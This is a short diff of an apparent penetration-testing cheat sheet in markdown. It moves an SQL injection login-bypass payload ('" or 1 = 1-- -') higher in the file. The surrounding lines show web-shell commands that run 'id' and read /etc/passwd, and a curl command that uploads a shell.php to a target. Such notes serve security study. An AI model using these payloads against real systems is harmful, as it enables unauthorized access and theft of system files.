@@ -41,7 +41,11 @@
 - __Now navigate to that path where you write the `shell.php`__
   - > __```<url>/shell.php?cmd=id```__
   - > __```<url>/shell.php?cmd=cat /etc/passwd```__
-
+## [SQL Injection](sql.md)
+## SQL Login bypass
+```
+" or 1 = 1-- -
+```
 ## 3. [SMB](smb.md)
 ### nmblookup
 - `nmblookup -A 10.0.1.22`
@@ -51,11 +55,7 @@
  
 ## [Msfconsole](msfconsole.md)
 
-## [SQL Injection](sql.md)
-## SQL Login bypass
-```
-" or 1 = 1-- -
-```
+
 ## [HTTP Method Tampering ](http_tampering.md)
   - __```curl http://<target_ip>/uploads --upload-file shell.php```__
 
